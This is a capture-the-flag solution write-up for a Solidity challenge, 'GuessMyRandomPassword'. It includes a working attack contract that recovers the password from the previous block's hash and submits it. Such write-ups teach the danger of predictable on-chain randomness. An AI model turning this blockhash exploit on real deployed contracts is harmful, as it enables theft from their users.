# GuessMyRandomPassword

## Solution :

To validate this challenge, the user needs to find the good password.

To do that, he needs to create an attack contract and get the `blockhash()` with the `block.number` of the transaction.

And after that, he needs to call the `guessMyRandomPassword()` function with this password.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/GuessMyRandomPassword.sol";

contract attackGuessMyRandomPassword {
    GuessMyRandomPassword originalCOntract;
    bytes32 password;

    constructor(address _originalContract) public {
        originalCOntract = GuessMyRandomPassword(_originalContract);
    }

    function exploit() public {
        password = blockhash(block.number - 1);
        originalCOntract.guessMyRandomPassword(password);
    }
}
```